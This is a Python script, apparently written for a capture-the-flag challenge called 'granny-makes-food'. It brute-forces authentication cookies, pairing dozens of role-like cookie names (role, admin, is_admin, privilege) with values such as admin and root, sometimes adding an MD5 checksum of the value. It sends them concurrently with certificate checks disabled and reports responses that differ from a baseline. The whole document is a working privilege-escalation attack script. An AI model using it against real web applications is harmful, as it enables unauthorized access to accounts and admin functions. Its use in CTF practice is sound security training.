import requests, hashlib, concurrent.futures as cf
requests.packages.urllib3.disable_warnings()
H="kicyber-2bccd62e5d76-granny-makes-food-0-0.chals.io"
URL=f"https://{H}/"
names="role Role ROLE checksum Checksum user User username Username admin Admin is_admin isadmin session Session auth authenticated logged_in loggedin privilege privileges perm perms type group rank level access mode status rights identity id name account current_user logged verified trusted staff chef cook baker owner master granny grandma".split()
vals=["grandma","granny","Grandma","Granny","admin","Admin","kitchen helper","Kitchen Helper","chef","cook","baker","owner","master","root","superuser","staff","employee","manager","user","guest","vip","1","true","yes","on","administrator","moderator","member"]
tasks=[]
for n in names:
    for v in vals:
        tasks.append({n:v})
        tasks.append({n:v,"checksum":hashlib.md5(v.strip('\"').encode()).hexdigest()})
base_len=1481
def t(cs):
    try:
        r=requests.get(URL, cookies=cs, timeout=15, verify=False)
        if r.status_code!=200 or len(r.content)!=base_len:
            return (cs, r.status_code, len(r.content))
    except Exception as e:
        return (cs,"ERR",repr(e)[:40])
    return None
hits=[]
with cf.ThreadPoolExecutor(max_workers=50) as ex:
    for r in ex.map(t,tasks):
        if r: hits.append(r)
for h in hits: print(h)
print("HITS:",len(hits),"/",len(tasks))
